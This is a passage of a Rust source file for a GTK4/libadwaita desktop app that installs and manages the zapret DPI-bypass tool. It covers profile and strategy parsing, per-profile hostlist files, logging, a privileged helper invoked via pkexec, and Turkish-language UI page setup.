use libadwaita as adw;
use gtk4 as gtk;
use adw::prelude::*;
use gtk::glib;
use adw::{Application, ApplicationWindow, HeaderBar, NavigationPage, NavigationView, ToolbarView, ResponseAppearance};
use gtk::{Box, Orientation, Button, ProgressBar, Label, Entry, Spinner, ScrolledWindow, FileFilter, CheckButton, ListBox, ListBoxRow, SelectionMode};
use std::process::{Command, Stdio};
use std::thread;
use std::time::Duration;
use std::sync::{mpsc, Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use std::fs;
use std::path::{Path, PathBuf};
use std::io::{self, Write, BufRead, BufReader};
use std::env;
use std::rc::Rc;
use std::cell::Cell;
use directories::ProjectDirs;
use gtk::gdk;
use gettext::Catalog;
use lazy_static::lazy_static;
use sys_locale::get_locale;
use std::io::Cursor;
const EN_MO: &[u8] = include_bytes!("../locale/en_US/LC_MESSAGES/zapret-gtk.mo");
const RU_MO: &[u8] = include_bytes!("../locale/ru_RU/LC_MESSAGES/zapret-gtk.mo");
const ICON_BYTES: &[u8] = include_bytes!("../zapretgtk512.png");
lazy_static! {
    static ref CATALOG: Mutex<Option<Catalog>> = Mutex::new(None);
}
fn t(s: &str) -> String {
    if let Ok(guard) = CATALOG.lock() {
        if let Some(catalog) = &*guard {
            return catalog.gettext(s).to_string();
        }
    }
    s.to_string()
}
#[derive(Clone, Debug)]
pub struct ProfileStrategy {
    pub strategy: String,
    pub active: bool,
}

fn get_profile_path(profile_id: usize) -> PathBuf {
    if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
        let config_dir = proj_dirs.config_dir();
        if !config_dir.exists() {
            let _ = fs::create_dir_all(config_dir);
        }
        if profile_id == 1 {
            config_dir.join("strategies.json")
        } else {
            config_dir.join(format!("strategies_{}.json", profile_id))
        }
    } else {
        if profile_id == 1 {
            PathBuf::from("strategies.json")
        } else {
            PathBuf::from(format!("strategies_{}.json", profile_id))
        }
    }
}

fn get_active_profile_path() -> PathBuf {
    if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
        let config_dir = proj_dirs.config_dir();
        if !config_dir.exists() {
            let _ = fs::create_dir_all(config_dir);
        }
        config_dir.join("active_profile.txt")
    } else {
        PathBuf::from("active_profile.txt")
    }
}

fn get_active_profile_id() -> usize {
    let path = get_active_profile_path();
    if let Ok(content) = fs::read_to_string(&path) {
        if let Ok(id) = content.trim().parse::<usize>() {
            if (1..=10).contains(&id) {
                return id;
            }
        }
    }
    1
}

fn save_active_profile_id(id: usize) {
    let path = get_active_profile_path();
    let _ = fs::write(path, id.to_string());
}

pub fn is_safe_strategy_param(input: &str) -> bool {
    let trimmed = input.trim();
    if !trimmed.starts_with("--") {
        return false;
    }
    trimmed.chars().all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '=' | '+' | ':' | ',' | '.' | '/' | '<' | '>' | ' ')
    })
}

pub fn is_valid_domain(domain: &str) -> bool {
    let trimmed = domain.trim();
    if trimmed.is_empty() {
        return false;
    }
    !trimmed.starts_with("http://") && !trimmed.starts_with("https://") && !trimmed.starts_with("www.")
}

pub fn parse_strategies_strict(content: &str) -> Result<Vec<ProfileStrategy>, String> {
    let trimmed = content.trim();
    if !trimmed.starts_with('[') || !trimmed.ends_with(']') {
        return Err(t("Geçersiz dosya formatı: JSON dizisi [...] formatında olmalıdır."));
    }
    let inner = trimmed[1..trimmed.len() - 1].trim();
    if inner.is_empty() {
        return Err(t("Dosya içerisinde herhangi bir strateji bulunamadı."));
    }

    let config_content = fs::read_to_string("/opt/zapret/config").unwrap_or_default();
    let mut results = Vec::new();

    if inner.contains("\"strategy\"") {
        let chars: Vec<char> = inner.chars().collect();
        let mut pos = 0;
        let mut found_any = false;
        while pos < chars.len() {
            if let Some(start_obj) = chars[pos..].iter().position(|&c| c == '{') {
                let obj_start = pos + start_obj;
                if let Some(end_obj) = chars[obj_start..].iter().position(|&c| c == '}') {
                    let obj_end = obj_start + end_obj;
                    let obj_str: String = chars[obj_start..=obj_end].iter().collect();
                    let mut strat_val = String::new();
                    let mut is_active = true;
                    if let Some(s_pos) = obj_str.find("\"strategy\"") {
                        if let Some(colon_pos) = obj_str[s_pos..].find(':') {
                            let rest = &obj_str[s_pos + colon_pos + 1..];
                            if let Some(first_q) = rest.find('"') {
                                let val_start = first_q + 1;
                                let mut val_end = val_start;
                                let val_chars: Vec<char> = rest.chars().collect();
                                while val_end < val_chars.len() {
                                    if val_chars[val_end] == '"' && (val_end == 0 || val_chars[val_end - 1] != '\\') {
                                        break;
                                    }
                                    val_end += 1;
                                }
                                strat_val = val_chars[val_start..val_end].iter().collect();
                                strat_val = strat_val.replace("\\\"", "\"");
                            }
                        }
                    }
                    if let Some(a_pos) = obj_str.find("\"active\"") {
                        if let Some(colon_pos) = obj_str[a_pos..].find(':') {
                            let rest = obj_str[a_pos + colon_pos + 1..].trim();
                            if rest.starts_with("false") {
                                is_active = false;
                            } else if rest.starts_with("true") {
                                is_active = true;
                            }
                        }
                    }
                    if !strat_val.is_empty() {
                        found_any = true;
                        let zapret_base_str = get_zapret_path().to_string_lossy().to_string();
                        let mut fixed_strat = strat_val.replace(&zapret_base_str, "/opt/zapret");
                        if let Some(start) = fixed_strat.find("/home/") {
                            if let Some(end) = fixed_strat[start..].find("/zapret/") {
                                let old_path = &fixed_strat[start..start + end + 7];
                                fixed_strat = fixed_strat.replace(old_path, "/opt/zapret");
                            }
                        }
                        if !is_safe_strategy_param(&fixed_strat) {
                            return Err(format!("{}:\n\n{}", t("Güvenlik Uyarısı: Geçersiz veya riskli parametre içeren strateji tespit edildi"), fixed_strat));
                        }
                        results.push(ProfileStrategy {
                            strategy: fixed_strat,
                            active: is_active,
                        });
                    }
                    pos = obj_end + 1;
                } else {
                    break;
                }
            } else {
                break;
            }
        }
        if !found_any && results.is_empty() {
            return Err(t("Dosya içerisinde geçerli bir strateji nesnesi bulunamadı."));
        }
    } else {
        let mut in_string = false;
        let mut current_strat = String::new();
        let mut is_escaped = false;
        let mut found_any = false;
        for c in inner.chars() {
            if c == '\\' && !is_escaped {
                is_escaped = true;
                continue;
            }
            if c == '"' && !is_escaped {
                in_string = !in_string;
                if !in_string && !current_strat.is_empty() {
                    found_any = true;
                    let zapret_base_str = get_zapret_path().to_string_lossy().to_string();
                    let mut fixed_strat = current_strat.replace(&zapret_base_str, "/opt/zapret");
                    if let Some(start) = fixed_strat.find("/home/") {
                        if let Some(end) = fixed_strat[start..].find("/zapret/") {
                            let old_path = &fixed_strat[start..start + end + 7];
                            fixed_strat = fixed_strat.replace(old_path, "/opt/zapret");
                        }
                    }
                    if !is_safe_strategy_param(&fixed_strat) {
                        return Err(format!("{}:\n\n{}", t("Güvenlik Uyarısı: Geçersiz veya riskli parametre içeren strateji tespit edildi"), fixed_strat));
                    }
                    let is_active = !config_content.is_empty() && config_content.contains(&fixed_strat);
                    results.push(ProfileStrategy {
                        strategy: fixed_strat,
                        active: is_active,
                    });
                    current_strat.clear();
                }
            } else if in_string {
                current_strat.push(c);
            }
            is_escaped = false;
        }
        if !found_any || results.is_empty() {
            return Err(t("Dosya içerisinde geçerli bir strateji bulunamadı."));
        }
    }

    if results.is_empty() {
        return Err(t("Dosya içerisinde geçerli bir strateji bulunamadı."));
    }

    Ok(results)
}

fn parse_strategies_from_content(content: &str) -> Vec<ProfileStrategy> {
    parse_strategies_strict(content).unwrap_or_default()
}

fn load_profile_strategies(profile_id: usize) -> Vec<ProfileStrategy> {
    let path = get_profile_path(profile_id);
    let content = match fs::read_to_string(&path) {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    parse_strategies_from_content(&content)
}

fn populate_strategies_box(list_box: &ListBox, strategies: &[ProfileStrategy]) {
    while let Some(child) = list_box.first_child() {
        list_box.remove(&child);
    }
    for item in strategies {
        let child_label = Label::builder()
            .label(&item.strategy)
            .wrap(true)
            .max_width_chars(50)
            .xalign(0.0)
            .build();
        let check = CheckButton::builder()
            .child(&child_label)
            .active(item.active)
            .margin_top(10)
            .margin_bottom(10)
            .margin_start(10)
            .margin_end(10)
            .build();
        list_box.append(&check);
    }
}

fn extract_strategies_from_list_box(list_box: &ListBox) -> Vec<ProfileStrategy> {
    let mut current_items = Vec::new();
    let mut child = list_box.first_child();
    while let Some(widget) = child {
        let content_widget = if let Ok(row) = widget.clone().downcast::<ListBoxRow>() {
            row.child()
        } else {
            Some(widget.clone())
        };
        if let Some(content) = content_widget {
            if let Ok(check) = content.downcast::<CheckButton>() {
                let val = if let Some(lbl) = check.label() {
                    Some(lbl)
                } else if let Some(child) = check.child() {
                    if let Ok(lbl) = child.downcast::<Label>() {
                        Some(lbl.label())
                    } else {
                        None
                    }
                } else {
                    None
                };
                if let Some(label_txt) = val {
                    current_items.push(ProfileStrategy {
                        strategy: label_txt.to_string(),
                        active: check.is_active(),
                    });
                }
            }
        }
        child = widget.next_sibling();
    }
    current_items
}

fn save_profile_strategies(profile_id: usize, strategies: &[ProfileStrategy]) -> io::Result<()> {
    let path = get_profile_path(profile_id);
    let mut file = fs::File::create(&path)?;
    writeln!(file, "[")?;
    for (i, s) in strategies.iter().enumerate() {
        let escaped = s.strategy.replace("\"", "\\\"");
        let comma = if i + 1 < strategies.len() { "," } else { "" };
        writeln!(file, "  {{\n    \"strategy\": \"{}\",\n    \"active\": {}\n  }}{}", escaped, s.active, comma)?;
    }
    writeln!(file, "]")?;
    Ok(())
}

fn get_config_path() -> PathBuf {
    get_profile_path(get_active_profile_id())
}

fn is_profile_non_empty(profile_id: usize) -> bool {
    let strats = load_profile_strategies(profile_id);
    !strats.is_empty()
}

fn is_strategies_json_non_empty() -> bool {
    is_profile_non_empty(get_active_profile_id())
}

fn get_profile_hostlist_path(profile_id: usize) -> PathBuf {
    if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
        let config_dir = proj_dirs.config_dir();
        if !config_dir.exists() {
            let _ = fs::create_dir_all(config_dir);
        }
        config_dir.join(format!("hostlist_{}.txt", profile_id))
    } else {
        PathBuf::from(format!("hostlist_{}.txt", profile_id))
    }
}

fn load_profile_hostlist(profile_id: usize) -> Vec<String> {
    let path = get_profile_hostlist_path(profile_id);
    if let Ok(content) = fs::read_to_string(&path) {
        return content.lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty() && !l.starts_with('#'))
            .collect();
    }
    Vec::new()
}

fn save_profile_hostlist(profile_id: usize, domains: &[String]) -> io::Result<()> {
    let path = get_profile_hostlist_path(profile_id);
    let mut content = String::new();
    for d in domains {
        let trimmed = d.trim();
        if !trimmed.is_empty() {
            content.push_str(trimmed);
            content.push('\n');
        }
    }
    fs::write(path, content)
}

fn apply_profile_hostlist_to_zapret(profile_id: usize) -> io::Result<()> {
    let domains = load_profile_hostlist(profile_id);
    let mode_filter = if domains.is_empty() { "none" } else { "hostlist" };

    let mut child = Command::new("pkexec")
        .arg(get_zapret_control_path())
        .arg("apply-hostlist")
        .arg(mode_filter)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    if let Some(mut stdin) = child.stdin.take() {
        for d in &domains {
            let _ = writeln!(stdin, "{}", d);
        }
    }

    let output = child.wait_with_output()?;
    if !output.status.success() {
        let err = String::from_utf8_lossy(&output.stderr);
        return Err(io::Error::new(io::ErrorKind::Other, format!("Failed to apply hostlist: {}", err)));
    }

    Ok(())
}

fn get_zapret_control_path() -> &'static str {
    "/usr/bin/zapret-control"
}

fn reset_profile_ui_to_1(current_profile_id: &Rc<Cell<usize>>, profile_btns: &[Button]) {
    current_profile_id.set(1);
    save_active_profile_id(1);
    for (idx, b) in profile_btns.iter().enumerate() {
        if idx == 0 {
            b.add_css_class("suggested-action");
        } else {
            b.remove_css_class("suggested-action");
        }
    }
}

fn get_secure_runtime_dir() -> PathBuf {
    let base_dir = std::env::var("XDG_RUNTIME_DIR")
        .ok()
        .filter(|s| !s.trim().is_empty())
        .map(PathBuf::from)
        .unwrap_or_else(|| {
            if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
                proj_dirs.cache_dir().to_path_buf()
            } else if let Ok(home) = std::env::var("HOME") {
                PathBuf::from(home).join(".cache").join("zapret-gtk")
            } else {
                #[cfg(unix)]
                let uid = unsafe { libc::getuid() };
                #[cfg(not(unix))]
                let uid = 1000;
                PathBuf::from(format!("/tmp/zapret-gtk-{}", uid))
            }
        });

    let runtime_dir = if base_dir.ends_with("zapret-gtk") || base_dir.to_string_lossy().contains("/tmp/zapret-gtk-") {
        base_dir
    } else {
        base_dir.join("zapret-gtk")
    };

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = fs::symlink_metadata(&runtime_dir) {
            if meta.file_type().is_symlink() {
                let _ = fs::remove_file(&runtime_dir);
            }
        }
        let _ = fs::create_dir_all(&runtime_dir);
        let _ = fs::set_permissions(&runtime_dir, fs::Permissions::from_mode(0o700));
    }

    #[cfg(not(unix))]
    {
        let _ = fs::create_dir_all(&runtime_dir);
    }

    runtime_dir
}

fn get_log_path() -> PathBuf {
    if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
        let config_dir = proj_dirs.config_dir();
        if !config_dir.exists() {
            let _ = fs::create_dir_all(config_dir);
        }
        config_dir.join("log.txt")
    } else {
        PathBuf::from("log.txt")
    }
}

fn rotate_logs() {
    let path = get_log_path();
    if path.exists() {
        let old_path = path.with_file_name("log-old.txt");
        let _ = fs::rename(&path, &old_path);
    }
}

fn log_to_file(msg: &str) {
    let path = get_log_path();

    let now = glib::DateTime::now_local().unwrap_or_else(|_| glib::DateTime::now_utc().unwrap());
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").unwrap();
    
    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
        let _ = writeln!(file, "[{}] {}", timestamp, msg);
    }
}

fn init_i18n() {
    let locale = get_locale().unwrap_or_else(|| String::from("en-US"));
    let simple_locale = locale.split(|c| c == '-' || c == '_').next().unwrap_or("en");
    let mo_bytes = match simple_locale {
        "tr" => None,
        "ru" => Some(RU_MO),
        _ => Some(EN_MO),
    };
    if let Some(bytes) = mo_bytes {
        if let Ok(catalog) = Catalog::parse(&mut Cursor::new(bytes)) {
            *CATALOG.lock().unwrap() = Some(catalog);
        } else {
            eprintln!("Failed to load translation catalog.");
        }
    }
}
enum AppMsg {
    Status(String),
    Done(io::Result<()>),
    PID(u32),
}
enum TestMsg {
    Started(u32),
    ProgressTick,
    Log(String),
    Finished(io::Result<Vec<String>>),
    InstallFinished(io::Result<()>),
}
fn main() {
    rotate_logs();
    init_i18n();
    log_to_file("Application started (v0.5.3)");
    ensure_polkit_rules_installed();
    let app = Application::builder()
        .application_id("com.ornek.zapret-gtk")
        .build();
    app.connect_activate(build_ui);
    app.run();
}
fn get_zapret_path() -> PathBuf {
    PathBuf::from("/opt/zapret")
}
fn delete_local_zapret_folder() {
    thread::spawn(move || {
        if let Ok(curr) = env::current_dir() {
            let local_zapret = curr.join("zapret");
            if local_zapret.exists() {
                println!("Deleting local zapret folder: {:?}", local_zapret);
                log_to_file(&format!("Deleting local zapret folder: {:?}", local_zapret));
                let _ = fs::remove_dir_all(&local_zapret);
            }
        }
    });
}
fn build_ui(app: &Application) {
    let nav_view = NavigationView::new();
    let content_box1 = Box::new(Orientation::Vertical, 0);
    let top_box1 = Box::new(Orientation::Vertical, 0);
    top_box1.set_vexpand(true);
    top_box1.set_valign(gtk::Align::Center); 
    let status_label = Label::builder()
        .label(&t("Hazır"))
        .margin_top(10)
        .visible(false)
        .wrap(true)
        .max_width_chars(40)
        .build();
    top_box1.append(&status_label);
    let placeholder_label = Label::builder()
        .label(&t("Bu uygulama, Zapret'in GTK arayüzü üzerinden kurulmasını ve yönetilmesini sağlayan bir uygulamadır")) 
        .margin_top(20)
        .margin_bottom(20)
        .wrap(true)
        .max_width_chars(40)
        .justify(gtk::Justification::Center)
        .visible(true)
        .build();
    top_box1.append(&placeholder_label);
    let dns_warning_label = Label::builder()
        .label(&format!("<span foreground='red' weight='bold'>{}</span>", t("UYARI: Varsayılan servis sağlayıcı DNS'i ile çalışmaz. Lütfen Cloudflare veya alternatif bir DNS kullanın.")))
        .use_markup(true)
        .margin_bottom(20)
        .wrap(true)
        .max_width_chars(40)
        .justify(gtk::Justification::Center)
        .visible(true)
        .build();
    top_box1.append(&dns_warning_label);
    let progress_bar = ProgressBar::builder()
        .margin_top(10)
        .margin_bottom(10)
        .margin_start(30)
        .margin_end(30)
        .visible(false) 
        .build();
    top_box1.append(&progress_bar);
    content_box1.append(&top_box1);
    let bottom_box1 = Box::new(Orientation::Vertical, 0);
    let button = Button::builder()
        .label(&t("Kuruluma Başla"))
        .margin_top(10)
        .margin_bottom(10)
        .margin_start(10)
        .margin_end(10)
        .css_classes(vec!["suggested-action", "pill"])
        .build();
    bottom_box1.append(&button);
    content_box1.append(&bottom_box1);
    let header1 = HeaderBar::builder()
        .show_end_title_buttons(true)
        .build();
    let view1 = ToolbarView::builder()
        .content(&content_box1)
        .build();
    view1.add_top_bar(&header1); 
    let page1 = NavigationPage::builder()
        .child(&view1)
        .title(&t("Zapret GTK"))
        .tag("install_page")
        .build();
    nav_view.add(&page1);
    let content_box_check = Box::new(Orientation::Vertical, 0);
    content_box_check.set_valign(gtk::Align::Center); 
    let header_check = HeaderBar::builder()
        .show_back_button(false) 
        .build();
    let spinner_check = Spinner::builder()
        .spinning(true)
        .width_request(48)
        .height_request(48)
        .margin_bottom(20)
        .build();
    content_box_check.append(&spinner_check);
    let status_label_check = Label::builder()
        .label(&t("Sistem ve VPN çakışmaları taranıyor..."))
        .css_classes(vec!["title-2"])
        .margin_bottom(10)
        .wrap(true)
        .max_width_chars(40)
        .build();
    content_box_check.append(&status_label_check);
    let conflict_list_label = Label::builder()
        .label("")
        .margin_bottom(20)
        .wrap(true)
        .max_width_chars(40)
        .build();
    content_box_check.append(&conflict_list_label);
    let force_continue_button = Button::builder()
        .label(&t("Yine de Devam Et"))
        .visible(false)
        .css_classes(vec!["destructive-action", "pill"])
        .margin_start(50)
        .margin_end(50)
        .build();
    content_box_check.append(&force_continue_button);
    let view_check = ToolbarView::builder()
        .content(&content_box_check)
        .build();
    view_check.add_top_bar(&header_check);
    let page_check = NavigationPage::builder()
        .child(&view_check)
        .title(&t("Zapret GTK"))
        .tag("check_page")
        .build();
    let content_box_test = Box::new(Orientation::Vertical, 0);
    let header_test = HeaderBar::builder()
        .show_back_button(false)
        .build();
    let top_box_test = Box::new(Orientation::Vertical, 0);
    top_box_test.set_vexpand(true);
    top_box_test.set_valign(gtk::Align::Center);
    let spinner_test = Spinner::builder()
        .spinning(true)
        .width_request(64)
        .height_request(64)
        .margin_bottom(20)
        .build();
    top_box_test.append(&spinner_test);
    let label_test_title = Label::builder()
        .label(&t("Stratejiler aranıyor..."))
        .css_classes(vec!["title-1"])
        .margin_bottom(10)
        .wrap(true)
        .max_width_chars(30)
        .build();
    top_box_test.append(&label_test_title);
    let label_test_info = Label::builder()
        .label(&t("Bu işlem internet hızınıza göre zaman alabilir.\nLütfen bekleyiniz."))
        .justify(gtk::Justification::Center)
        .margin_bottom(20)
        .wrap(true)
        .max_width_chars(40)
        .build();
    top_box_test.append(&label_test_info);
    let label_test_counter = Label::builder()
        .label(&t("Denenen Stratejiler: 0"))
        .css_classes(vec!["accent"]) 
        .margin_bottom(20) 
        .build();
    top_box_test.append(&label_test_counter);
    content_box_test.append(&top_box_test);
    let bottom_box_test = Box::new(Orientation::Vertical, 0);
    let test_cancel_button = Button::builder()
        .label(&t("İptal"))
        .css_classes(vec!["destructive-action", "pill"])
        .margin_top(10)
        .margin_bottom(10)
        .margin_start(10)
        .margin_end(10)
        .build();
    bottom_box_test.append(&test_cancel_button);
    content_box_test.append(&bottom_box_test);
    let view_test = ToolbarView::builder()
        .content(&content_box_test)
        .build();
    view_test.add_top_bar(&header_test);
    let page_test = NavigationPage::builder()
        .child(&view_test)
        .title(&t("Zapret GTK"))
        .tag("test_page")
        .build();
    let content_box2 = Box::new(Orientation::Vertical, 0);
    let header2 = HeaderBar::builder()
        .build();
    let top_box2 = Box::new(Orientation::Vertical, 0);
    top_box2.set_vexpand(true);
    let info_label = Label::builder()
        .label(&t("Erişemediğiniz web sitelerinin alan adlarını, her satıra bir tane gelecek şekilde yazın. Başlarına 'https://' ve 'www.' eklemeyin. Örnek: (a.com), (b.net)"))
        .margin_top(15)
        .margin_bottom(10)
        .wrap(true)
        .max_width_chars(40)
        .justify(gtk::Justification::Center)
        .build();
    top_box2.append(&info_label);
    let scrolled_window = ScrolledWindow::builder()
        .hscrollbar_policy(gtk::PolicyType::Never)
        .min_content_height(150)
        .vexpand(true)
        .margin_start(10)
        .margin_end(10)
        .margin_bottom(10)
        .build();
    let entries_container = Box::new(Orientation::Vertical, 10);
    entries_container.set_margin_top(10);
    entries_container.set_margin_bottom(10);
    entries_container.set_margin_start(10);
    entries_container.set_margin_end(10);
    scrolled_window.set_child(Some(&entries_container));
    top_box2.append(&scrolled_window);
    content_box2.append(&top_box2);
    let bottom_box2 = Box::new(Orientation::Vertical, 0);
    bottom_box2.set_margin_start(10);
    bottom_box2.set_margin_end(10);
    bottom_box2.set_margin_bottom(10);

    let preset_btn_content = Box::new(Orientation::Horizontal, 8);
    preset_btn_content.set_halign(gtk::Align::Center);
    let preset_icon = gtk::Image::from_icon_name("starred-symbolic");
    let preset_lbl = Label::new(Some(&t("Hazır Stratejileri Yükle (Hızlı Kurulum)")));
    preset_btn_content.append(&preset_icon);
    preset_btn_content.append(&preset_lbl);

    let preset_button = Button::builder()
        .child(&preset_btn_content)
        .css_classes(vec!["pill"])
        .halign(gtk::Align::Center)
        .margin_start(10)
        .margin_end(10)
        .margin_top(5)
        .margin_bottom(5)
        .build();
    bottom_box2.append(&preset_button);

    let action_buttons_box = Box::new(Orientation::Horizontal, 10);
    action_buttons_box.set_halign(gtk::Align::Center);
    action_buttons_box.set_margin_top(5);
    action_buttons_box.set_margin_bottom(5);
    let import_btn_content = Box::new(Orientation::Horizontal, 10);
    import_btn_content.set_halign(gtk::Align::Center);
    let import_icon = gtk::Image::from_icon_name("document-open-symbolic");
    let import_lbl = Label::new(Some(&t("İçe Aktar")));
    import_btn_content.append(&import_icon);
    import_btn_content.append(&import_lbl);

    let import_button = Button::builder()
        .child(&import_btn_content)
        .css_classes(vec!["pill"])
        .build();
    action_buttons_box.append(&import_button);
    let finish_button = Button::builder()
        .label(&t("Strateji aramasını başlat."))
        .css_classes(vec!["suggested-action", "pill"])
        .build();
    action_buttons_box.append(&finish_button);
    bottom_box2.append(&action_buttons_box);
    content_box2.append(&bottom_box2);
    let add_button = Button::builder()
        .icon_name("list-add-symbolic")
        .tooltip_text(&t("Yeni satır ekle"))
        .css_classes(vec!["flat", "circular"])
        .halign(gtk::Align::Center)
        .margin_top(5)
        .margin_bottom(5)
        .build();
    let entries_container_clone = entries_container.clone();
    let add_button_clone = add_button.clone();
    add_button.connect_clicked(move |_| {
        add_entry_row(&entries_container_clone, &add_button_clone, true);
    });
    add_entry_row(&entries_container, &add_button, false);
    let view2 = ToolbarView::builder()
        .content(&content_box2)
        .build();
    view2.add_top_bar(&header2);
    let page2 = NavigationPage::builder()
        .child(&view2)
        .title(&t("Zapret GTK"))
        .tag("settings_page")
        .build();

    let content_box_rescan = Box::new(Orientation::Vertical, 0);
    let header_rescan = HeaderBar::builder()
        .show_back_button(true)
        .build();
    let top_box_rescan = Box::new(Orientation::Vertical, 0);
    top_box_rescan.set_vexpand(true);
    let info_label_rescan = Label::builder()
        .label(&t("Erişemediğiniz web sitelerinin alan adlarını, her satıra bir tane gelecek şekilde yazın. Başlarına 'https://' ve 'www.' eklemeyin. Örnek: (a.com), (b.net)"))
        .margin_top(15)
        .margin_bottom(10)
        .wrap(true)
        .max_width_chars(40)
        .justify(gtk::Justification::Center)
        .build();
    top_box_rescan.append(&info_label_rescan);
    let scrolled_window_rescan = ScrolledWindow::builder()
        .hscrollbar_policy(gtk::PolicyType::Never)
        .min_content_height(150)
        .vexpand(true)
        .margin_start(10)
        .margin_end(10)
        .margin_bottom(10)
        .build();
    let entries_container_rescan = Box::new(Orientation::Vertical, 10);
    entries_container_rescan.set_margin_top(10);
    entries_container_rescan.set_margin_bottom(10);
    entries_container_rescan.set_margin_start(10);
    entries_container_rescan.set_margin_end(10);
    scrolled_window_rescan.set_child(Some(&entries_container_rescan));
    top_box_rescan.append(&scrolled_window_rescan);
    content_box_rescan.append(&top_box_rescan);

    let bottom_box_rescan = Box::new(Orientation::Vertical, 0);
    bottom_box_rescan.set_margin_start(10);
    bottom_box_rescan.set_margin_end(10);
    bottom_box_rescan.set_margin_bottom(15);

    let finish_button_rescan = Button::builder()
        .label(&t("Strateji aramasını başlat."))
        .css_classes(vec!["suggested-action", "pill"])
        .halign(gtk::Align::Center)
        .margin_top(5)
        .margin_bottom(5)
        .build();
    bottom_box_rescan.append(&finish_button_rescan);
    content_box_rescan.append(&bottom_box_rescan);

    let add_button_rescan = Button::builder()
        .icon_name("list-add-symbolic")
        .tooltip_text(&t("Yeni satır ekle"))
        .css_classes(vec!["flat", "circular"])
        .halign(gtk::Align::Center)
        .margin_top(5)
        .margin_bottom(5)
        .build();
    let entries_container_rescan_clone = entries_container_rescan.clone();
    let add_button_rescan_clone = add_button_rescan.clone();
    add_button_rescan.connect_clicked(move |_| {
        add_entry_row(&entries_container_rescan_clone, &add_button_rescan_clone, true);
    });
    add_entry_row(&entries_container_rescan, &add_button_rescan, false);

    let view_rescan = ToolbarView::builder()
        .content(&content_box_rescan)
        .build();
    view_rescan.add_top_bar(&header_rescan);
    let page_rescan = NavigationPage::builder()
        .child(&view_rescan)
        .title(&t("Zapret GTK"))
        .tag("rescan_page")
        .build();

    let content_box_rescan_check = Box::new(Orientation::Vertical, 0);
    content_box_rescan_check.set_valign(gtk::Align::Center);
    content_box_rescan_check.set_vexpand(true);
    let header_rescan_check = HeaderBar::builder()
        .show_back_button(true)
        .build();
    let spinner_rescan_check = Spinner::builder()
        .spinning(true)
        .width_request(64)
        .height_request(64)
        .margin_bottom(20)
        .build();
    content_box_rescan_check.append(&spinner_rescan_check);
    let status_label_rescan_check = Label::builder()
        .label(&t("Sistem ve VPN çakışmaları taranıyor..."))
        .css_classes(vec!["title-2"])
        .margin_bottom(10)
        .wrap(true)
        .max_width_chars(30)
        .build();
    content_box_rescan_check.append(&status_label_rescan_check);
    let conflict_list_label_rescan = Label::builder()
        .label("")
        .margin_bottom(20)
        .wrap(true)
        .max_width_chars(40)
        .build();
    content_box_rescan_check.append(&conflict_list_label_rescan);

    let rescan_check_actions_box = Box::new(Orientation::Vertical, 10);
    rescan_check_actions_box.set_margin_start(50);
    rescan_check_actions_box.set_margin_end(50);

    let stop_continue_btn_rescan = Button::builder()
        .label(&t("Durdur ve Devam Et"))
        .visible(false)
        .css_classes(vec!["suggested-action", "pill"])
        .build();
    let force_continue_btn_rescan = Button::builder()
        .label(&t("Yine de Devam Et"))
        .visible(false)
        .css_classes(vec!["destructive-action", "pill"])
        .build();

    rescan_check_actions_box.append(&stop_continue_btn_rescan);
    rescan_check_actions_box.append(&force_continue_btn_rescan);
    content_box_rescan_check.append(&rescan_check_actions_box);
    let view_rescan_check = ToolbarView::builder()
        .content(&content_box_rescan_check)
        .build();
    view_rescan_check.add_top_bar(&header_rescan_check);
    let page_rescan_check = NavigationPage::builder()
        .child(&view_rescan_check)
        .title(&t("Zapret GTK"))
        .tag("rescan_check_page")
        .build();

    let content_box_hostlist = Box::new(Orientation::Vertical, 0);
    let header_hostlist = HeaderBar::builder()
        .show_back_button(true)
        .build();
    let view_hostlist = ToolbarView::builder()
        .content(&content_box_hostlist)
        .build();
    view_hostlist.add_top_bar(&header_hostlist);

    let page_hostlist = NavigationPage::builder()
        .child(&view_hostlist)
        .title(&t("Hostlist"))
        .tag("hostlist_page")
        .build();

    let top_box_hostlist = Box::new(Orientation::Vertical, 0);
    top_box_hostlist.set_vexpand(true);

    let hostlist_info_label = Label::builder()
        .label(&t("Zapret'in yalnızca belirli web sitelerinde çalışmasını istiyorsanız, bu sitelerin alan adlarını her satıra bir tane gelecek şekilde yazın. Boş bırakırsanız filtreleme tüm sitelere uygulanır."))
        .margin_top(15)
        .margin_bottom(10)
        .margin_start(20)
        .margin_end(20)
        .wrap(true)
        .max_width_chars(42)
        .justify(gtk::Justification::Center)
        .build();
    top_box_hostlist.append(&hostlist_info_label);

    let scrolled_hostlist = ScrolledWindow::builder()
        .hscrollbar_policy(gtk::PolicyType::Never)
        .min_content_height(180)
        .vexpand(true)
        .margin_start(10)
        .margin_end(10)
        .margin_bottom(10)
        .build();

    let entries_container_hostlist = Box::new(Orientation::Vertical, 10);
    entries_container_hostlist.set_margin_top(10);
    entries_container_hostlist.set_margin_bottom(10);
    entries_container_hostlist.set_margin_start(10);
    entries_container_hostlist.set_margin_end(10);
    scrolled_hostlist.set_child(Some(&entries_container_hostlist));
    top_box_hostlist.append(&scrolled_hostlist);
    content_box_hostlist.append(&top_box_hostlist);

    let add_button_hostlist = Button::builder()
        .icon_name("list-add-symbolic")
        .tooltip_text(&t("Yeni satır ekle"))
        .css_classes(vec!["flat", "circular"])
        .halign(gtk::Align::Center)
        .margin_top(5)
        .margin_bottom(5)
        .build();
    let entries_container_hostlist_c = entries_container_hostlist.clone();
    let add_button_hostlist_c = add_button_hostlist.clone();
    add_button_hostlist.connect_clicked(move |_| {
        add_entry_row(&entries_container_hostlist_c, &add_button_hostlist_c, true);
    });

    let bottom_box_hostlist = Box::new(Orientation::Vertical, 0);
